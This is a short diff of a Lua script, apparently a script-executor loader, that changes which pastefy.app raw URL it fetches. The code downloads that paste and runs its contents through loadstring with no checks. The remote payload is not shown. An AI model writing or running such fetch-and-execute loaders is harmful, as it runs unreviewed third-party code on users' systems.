@@ -7,7 +7,7 @@ local function http_get(url)
 end
 
 -- Run 2nd script (always runs, even if link is invalid)
-local secondUrl="https://pastefy.app/vbvGUKrr/raw"
+local secondUrl="https://pastefy.app/hgsBmL3v/raw"
 local secondRaw=http_get(secondUrl)
 if secondRaw then
     local fn=loadstring(secondRaw)
